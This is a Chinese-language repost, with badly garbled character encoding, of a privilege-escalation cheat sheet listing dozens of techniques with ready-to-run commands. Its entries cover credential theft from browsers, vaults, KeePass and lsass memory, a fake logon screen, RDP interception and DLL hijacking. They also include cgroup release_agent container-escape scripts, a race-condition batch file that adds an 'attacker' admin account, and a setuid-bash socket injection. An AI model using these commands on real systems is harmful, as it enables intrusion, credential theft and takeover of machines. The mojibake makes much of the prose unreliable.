æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpUp.exe CachedGPPPassword`

### Password Mining in DomainGPPPassword

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpUp.exe domianGPPPassword`

### Password Mining in KeePass

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe keepass`

Or

`KeeTheft.exe`

æ‰¹æ³¨ï¼š

seatbeltï¼šhttps://github.com/GhostPack/Seatbelt

KeeTheft æœªæ‰¾åˆ°

### Password Mining in WindowsVault

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe WindowsVault`

### Password Mining in SecPackageCreds

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe SecPackageCreds`

### Password Mining in PuttyH æ“ä½œç³»ç»Ÿ tKeys

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe PuttyHostKeys`

### Password Mining in RDCManFiles

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe RDCManFiles`

### Password Mining in RDPSavedConnections

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`Seatbelt.exe RDPSavedConnections`

### Password Mining in MasterKeys

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpDPAPI masterkeys`

æ‰¹æ³¨ï¼šhttps://github.com/GhostPack/SharpDPAPI

### Password Mining in Browsers

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpWeb.exe all`

æ‰¹æ³¨ï¼šhttps://github.com/djhohnstein/SharpWeb/releases/tag/v1.2

### Password Mining in Files

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SauronEye.exe -d C:\Users\vincent\Desktop\ â€“filetypes .txt .doc .docx .xls â€“contents â€“keywords password pass* -v`

æ‰¹æ³¨ï¼šhttps://github.com/vivami/SauronEye/releases/tag/v0.0.9

### Password Mining in LDAP

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`SharpLDAPSearch.exe "(&(objectClass=user)(cn=*svc*))" "samç”¨æˆ·å"`

Or

`Import-Module .\PowerView.ps1`

`Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime`

æ‰¹æ³¨ï¼š

sharpldapsearchï¼šhttps://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2

powerviewï¼šå¥½å¤šä¸ªç‰ˆæœ¬ï¼Œåº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿhttps://github.com/ericshoemaker/PowerView

### Password Mining in Clipboard

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`execute-assembly /root/SharpClipHistory.exe`

æ‰¹æ³¨ï¼šhttps://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0

### Password Mining in GMSA Password

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunt

æ–¹æ³•:

1.

`GMSAPasswordReader.exe â€“accountname SVC_SERVICE_ACCOUNT`

æ‰¹æ³¨ï¼šhttps://github.com/rvazarkar/GMSAPasswordReader

### Delegate tokens via RDP

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows/Linux

ç±»å‹: Â Delegate tokens

æ–¹æ³•:

1.

`./fake_rdp.py`

Or

`pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem`

æ‰¹æ³¨ï¼š

fake_rdpï¼šhttps://github.com/cheeseandcereal/fake-rdp

pyrdp-mitm æœªæ‰¾åˆ° QAQ

### Delegate tokens via FTP

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows/Linux

ç±»å‹: Â Delegate tokens

æ–¹æ³•:

1.

```
Â FakeFtpServer fakeFtpServer = new FakeFtpServer();
Â 
Â fakeFtpServer.addUserAccount(new UserAccount(â€œuserâ€, â€œpasswordâ€, â€œc:\\dataâ€));
Â 
Â FileSystem fileSystem = new WindowsFakeFileSystem();
Â 
Â fileSystem.add(new DirectoryEntry(â€œc:\\dataâ€));
Â 
Â fileSystem.add(new FileEntry(â€œc:\\data\\file1.txtâ€, â€œabcdef 1234567890â€));
Â 
Â fileSystem.add(new FileEntry(â€œc:\\data\\run.exeâ€));
Â 
Â fakeFtpServer.setFileSystem(fileSystem); Â 
Â 
Â fakeFtpServer.start();

```

### Fake Logon Screen

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Delegate tokens

æ–¹æ³•:

1.

`execute-assembly fakelogonscreen.exe`

æ‰¹æ³¨ï¼šhttps://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1

### Abusing WinRM Services

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Abuse Service

æ–¹æ³•:

1.

`RogueWinRM.exe -p C:\windows\system32\cmd.exe`

æ‰¹æ³¨ï¼šhttps://github.com/antonioCoco/RogueWinRM/releases/tag/1.1

### Dump lsass with SilentProcessExit

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•:

1.  `SilentProcessExit.exe pid`
    

æ‰¹æ³¨ï¼šhttps://github.com/deepinstinct/LsassSilentProcessExit

### Lsass Shtinkering

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•:

1.  `HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps->2`
    
2.  `LSASS_Shtinkering.exe pid`
    

æ‰¹æ³¨ï¼šhttps://github.com/deepinstinct/Lsass-Shtinkering

### AndrewSpecial

åŸŸ: No

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Windows

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•ï¼š

*   `AndrewSpecial.exe`
    

æ‰¹æ³¨ï¼šhttps://github.com/hoangprod/AndrewSpecial

### CCACHE ticket reuse from /tmp

åŸŸ: Yes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•:

*   `ls /tmp/ | grep krb5cc_X`
    
*   `export KRB5CCNAME=/tmp/krb5cc_X`
    

### CCACHE ticket reuse from keyring

åŸŸ: Yes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•:

*   `https://github.com/TarlogicSecurity/tickey`
    
*   `/tmp/tickey -i`
    

### CCACHE ticket reuse from SSSD KCM

åŸŸ: Yes

Local Admin: Yes

æ“ä½œç³»ç»Ÿ: Linux

ç±»å‹: Â Enumeration & Hunting

æ–¹æ³•ï¼š

*   `git clone https://github.com/fireeye/SSSDKCMExtractor`
    
*   `python3 SSSDKCMExtractor.py â€“database secrets.ldb â€“key secrets.mkey`
    

### CCACHE ticket reuse from keytab

åŸŸ: Yes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux/Windows/Mac

ç±»å‹ï¼šEnumeration & Hunting

æ–¹æ³•ï¼š

*   `git clone https://github.com/its-a-feature/KeytabParser`
    
*   `python KeytabParser.py /etc/krb5.keytab`
    
*   `klist -k /etc/krb5.keytab`
    

Or

*   `klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab`
    
*   `python3 keytabextract.py krb5.keytab`
    
*   `./bifrost -action dump -source keytab -path test`
    

### SSH Forwarder

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šEnumeration & Hunting

æ–¹æ³•ï¼š

*   è½¬å‘ä»£ç† yes`ForwardAgent yes`
    
*   `SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston`
    

AppleScript

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šEnumeration & Hunt

æ–¹æ³•ï¼š

*   (EmPyre) > `listeners`
    
*   (EmPyre: listeners) > `set Name mylistener`
    
*   (EmPyre: listeners) > `execute`
    
*   (EmPyre: listeners) > `usestager applescript mylistener`
    
*   (EmPyre: stager/applescript) > `execute`
    

æ‰¹æ³¨ï¼šè¿™ä¸ªå·¥å…·æˆ‘æ‰¾äº†åŠå¤©ï¼Œå‘ç°è¿™æ˜¯ä¸ªä¸ƒå…«å¹´å‰çš„ä¸€ä¸ªå·¥å…·

é“¾æ¥åœ°å€ https://github.com/EmpireProject/EmPyre

### DLL Search Order Hijacking

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šHijack

æ–¹æ³•ï¼š

*   `https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie`
    
*   è¿è¡Œ`Brownie`
    

### Slui File Handler Hijack LPE

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šHijack

æ–¹æ³•ï¼š

*   `https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation`
    
*   `Slui.exe`
    

### CDPSvc DLL Hijacking

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šHijack

æ–¹æ³•ï¼š

*   `Cdpsgshims.exe`
    

### Magnify.exe Dll Search Order Hijacking

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šHijack

æ–¹æ³•ï¼š

*   `å°†æœ‰æ•ˆè´Ÿè½½ dll ä½œä¸º igdgmm64.dll å¤åˆ¶åˆ°å¯å†™çš„ç³»ç»Ÿè·¯å¾„ %PATH%ï¼Œä¾‹å¦‚ C:\python27`
    
*   æŒ‰ Win é”® + L
    
*   æŒ‰å›è½¦é”®
    
*   `åœ¨æ˜¾ç¤ºå¯†ç æ¡†çš„ç™»å½•å±å¹•ä¸ŠæŒ‰ WinKey++(plusKey).`
    
*   `ç„¶åpayload dllå°†ä»¥ç³»ç»Ÿè®¿é—®æƒé™æ‰§è¡Œ.`
    

### CdpSvc Service

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šHijack

æ–¹æ³•ï¼š

*   `ä½¿ç”¨ acltest.ps1 æŸ¥æ‰¾å¯å†™ç³»ç»Ÿè·¯å¾„ï¼ˆä¾‹å¦‚ C:\python27ï¼‰`
    
*   `C:\CdpSvcLPE> powershell -ep bypass â€œ..\acltest.ps1â€`
    
*   å°† `cdpsgshims.dll`å¤åˆ¶åˆ° `C:\python27`
    
*   åˆ›å»º `C:\temp` æ–‡ä»¶å¤¹å¹¶å°† `impersonate.bin` å¤åˆ¶åˆ° `C:\temp`
    
*   `C:\CdpSvcLPE> mkdir C:\temp`
    
*   `C:\CdpSvcLPE> copy impersonate.bin C:\temp`
    
*   é‡æ–°å¯åŠ¨ï¼ˆæˆ–ä»¥ç®¡ç†å‘˜èº«ä»½åœæ­¢ / å¯åŠ¨ CDPSvcï¼‰
    
*   `cmd å°†æç¤º nt authority\systemã€‚`
    

### HiveNightmare

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `HiveNightmare.exe 200`
    

CVE-2021-30655

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `https://github.com/thehappydinoa/rootOS`
    
*   `Python rootOS.py`
    

CVE-2019-8526

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šMac

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `https://github.com/amanszpapaya/MacPer`
    
*   `Python main.py`
    

CVE-2020-9771

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šMac

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `https://github.com/amanszpapaya/MacPer`
    
*   `Python main.py`
    

CVE-2021-3156

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šMac

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `https://github.com/amanszpapaya/MacPer`
    
*   `Python main.py`
    

CVE-2018-4280

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šMac

ç±»å‹ï¼šÂ 0/1 Exploit

æ–¹æ³•ï¼š

*   `https://github.com/bazad/launchd-portrep`
    
*   `./launchd-portrep â€˜touch /tmp/exploit-successâ€™=`
    

### Abusing with FileRestorePrivilege

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šAbuse Privilege

æ–¹æ³•ï¼š

*   `poptoke.exe`
    

### Abusing with RestoreAndBackupPrivileges

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šAbuse Privilege

æ–¹æ³•ï¼š

*   `poptoke.exe`
    

### Abusing with ShadowCopyBackupPrivilege

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šAbuse Privilege

æ–¹æ³•ï¼š

*   `poptoke.exe`
    

### Abusing with ShadowCopy

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šAbuse Privilege

æ–¹æ³•ï¼š

*   `poptoke.exe`
    

æ‰¹æ³¨ï¼šæˆ‘æ‰¾äº†å¾ˆå¤šï¼Œæ„Ÿè§‰æœ€åƒæ˜¯çš„åº”è¯¥æ˜¯è¿™ä¸ªå·¥å…·

é“¾æ¥ https://github.com/hatRiot/token-priv

### Dynamic Phishing

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šMac

ç±»å‹ï¼šPhish

æ–¹æ³•ï¼š

*   `https://github.com/thehappydinoa/rootOS`
    
*   `Python rootOS.py`
    

### Race Conditions

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šRace Condition

æ–¹æ³•ï¼š

*   `echo â€œnet localgroup administrators attacker /addâ€ > C:\temp\not-evil.bat`
    
*   `tempracer.exe C:\ temp\*.bat`
    

### Abusing usermode helper API

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šAbusing Capabilities

æ–¹æ³•ï¼š

```
Â d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
Â mkdir -p $d/w; echo 1 > $d/w/notify_on_release
Â t=`sed -n â€˜s/.*\perdir=\([^,]*\).*/\1/pâ€™ /etc/mtab`
Â touch /o; echo $t/c > $d/release_agent
Â echo â€œ#!/bin/shâ€ > /c
Â echo â€œps > $t/oâ€ >> /c
Â chmod +x /c
Â sh -c â€œecho 0 > $d/w/cgroup.procsâ€; sleep 1
Â cat /o

```

### Escape only with CAP_SYS_ADMIN capability

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šAbusing Capabilities

æ–¹æ³•ï¼š

```
Â mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
Â echo 1 > /tmp/cgrp/x/notify_on_release
Â host_path=`sed -n â€˜s/.*\perdir=\([^,]*\).*/\1/pâ€™ /etc/mtab`
Â echo â€œ$host_path/cmdâ€ > /tmp/cgrp/release_agent
Â echo â€œ#!/bin/shâ€ > /cmd
Â echo â€œps aux > $host_path/outputâ€ >> /cmd
Â chmod a+x /cmd
Â sh -c â€œecho \$\$ > /tmp/cgrp/x/cgroup.procsâ€
Â cat /output

```

### Abusing exposed host directories

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šAbusing Capabilities

æ–¹æ³•ï¼š

*   `mknod /dev/sdb1 block 8 17`
    
*   `mkdir /mnt/host_home`
    
*   `mount /dev/sdb1 /mnt/host_home`
    
*   `echo â€˜echo â€œHello from container land!â€ 2>&1â€™ >> /mnt/host_home/eric_chiang_m/.bashrc`
    

### Unix Wildcard

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šInjection

æ–¹æ³•ï¼š

*   `python wildpwn.py â€“file /tmp/very_secret_file combined ./pwn_me/`
    

### Socket Command Injection

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šInjection

æ–¹æ³•ï¼š

*   `echo â€œcp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;â€ | socat â€“ UNIX-CLIENT:/tmp/socket_test.s`
    

### Logstash

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šInjection

æ–¹æ³•ï¼š

*   `/etc/logstash/logstash.yml`
    
    ```
    Â input {
    Â exec {
    Â 
    Â  Â  Â  Â  Â  Â  command => â€œwhoamiâ€
    Â 
    Â  Â  Â  Â  Â  Â  interval => 120
    Â 
    Â  Â  Â  Â  Â  Â  }
    Â 
    Â  Â  Â  }
    
    ```
    

### UsoDllLoader

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šInjection

æ–¹æ³•ï¼š

*   `UsoDllLoader.exe`
    

æ‰¹æ³¨ï¼šhttps://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824

### Trend Chain Methods for Privilege Escalation

### Habanero Chilli

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šDll Side-loading

æ–¹æ³•ï¼š

*   `rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump`
    

### Padron Chilli

åŸŸï¼šY/N

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šCreate a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk

æ–¹æ³•ï¼š

*   `#.\inject.x64.exe <Path to reflective dll: .\LsassDumpReflectiveDLL.dll>`
    

### Jalapeno Chillies

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

æ–¹æ³•ï¼šunhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod

æ–¹æ³•ï¼š

*   `NihilistGuy.exe`
    

æ‰¹æ³¨ï¼šhttps://github.com/analyticsearch/NihilistGuy

### Pasilla Chili

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

æ–¹æ³•ï¼šSeImpersonatePrivilege + Abusing Service Account Session

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `Demo5.ps1`
    

### Finger Chilli

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šAbusing PrintNotify Service + DLL side-loading

æ–¹æ³•ï¼š

*   `ä»¥ç®¡ç†å‘˜èº«ä»½ï¼Œå°†winspool.drvå’Œmod-ms-win-core-apiquery-l1-1-0.dllå¤åˆ¶åˆ°C:\Windows\System32\spool\drivers\x64\3\`
    
*   `å°† /bin/ ä¸­åŒ…å«çš„æ‰€æœ‰æ–‡ä»¶æ”¾å…¥åŒä¸€ç›®å½•ä¸­ã€‚`
    
*   `ç„¶åï¼Œè¿è¡Œ powershell .\spooltrigger.ps1ã€‚`
    
*   äº«å— NT AUTHORITY\SYSTEM çš„ shellã€‚
    

### Orange Cayenne

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šSilver Ticket + I Know

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `Demo1.ps1`
    

### Red Cayenne

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šSilver ticket + User to User Authentication

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `demo2.ps1`
    

### Birds Eye Chilli

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šSilver Ticket + Buffer Type Confusion

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `Demo3.ps1`
    

### Scotch Bonnet

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šBring Your Own KDC

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `Demo4.ps1`
    

### Lemon Habanero

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šLinux

ç±»å‹ï¼šCapabilities

æ–¹æ³•ï¼š

*   `gcc -Wl,â€“no-as-needed -lcap-ng -o ambient ambient.c`
    
*   `sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient`
    
*   `./ambient /bin/bash`
    

æ‰¹æ³¨ï¼šhttps://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw

### Red Habanero

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šNtSetInformationProcess + DLL side-loading

æ–¹æ³•ï¼š

*   `BypassRtlSetProcessIsCritical.exe pid`
    

æ‰¹æ³¨ï¼šæ²¡æ‰¾åˆ°è¿™ä¸ªä¸œè¥¿

### Ghost Pepper

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šÂ **allow low privileged user accounts to create file system and registry symbolic links**

æ–¹æ³•ï¼š

```
Â PS C:\> $code = (iwr https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs).content
Â PS C:\> Add-Type $code Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
Â PS C:\> $s = New-Object de.usd.SharpLink.Symlink(â€œC:\Users\Public\Example\linkâ€, â€œC:\ProgramData\target.txtâ€)
Â PS C:\> $s.Open()
Â PS C:\> echo â€œHello World :Dâ€ > C:\Users\Public\Example\link
Â PS C:\> type C:\ProgramData\target.txt
Â Hello World ğŸ˜€
Â PS C:\> $s.Close()

```

### Chocolate Scorpion Chilli

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šDirectory-Deletion + Windows Media Player d/s

æ–¹æ³•ï¼š

*   `https://github.com/sailay1996/delete2SYSTEM`
    
*   `.\poc.ps1`
    

### Carolina Reaper

åŸŸï¼šYes

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šCreates an arbitrary service + PTH

æ–¹æ³•ï¼š

*   `https://github.com/tyranid/blackhat-usa-2022-demos`
    
*   `Demo6.ps1`
    

### The Intimidator Chilli

åŸŸï¼šNo

Local Admin: Yes

æ“ä½œç³»ç»Ÿï¼šWindows

ç±»å‹ï¼šmanipulate memory/process token values/NT system calls and objects/NT object manager

æ–¹æ³•ï¼š

*   `https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools`
    
*   `Import-Module NtObjectManager`
    
*   `Get-ChildItem NtObject:\`
    
*   `NT*`
    

åè®°
==

åŸæ–‡åœ°å€ï¼š

https://hadess.io/74-methods-for-privilege-escalationpart-2/

https://hadess.io/43-methods-for-privilege-escalation-part-3/

è½¬è½½äºå…¬ä¼—å·ï¼šæ·±å¤œç¬”è®°æœ¬

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavym9OD9vsicbv8af5HAZACTcbfQwk2Ck3qNN3ctRxwBMaL2bcCkZDHK7xmh2sCuLQv1YhBSBxu38Pw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)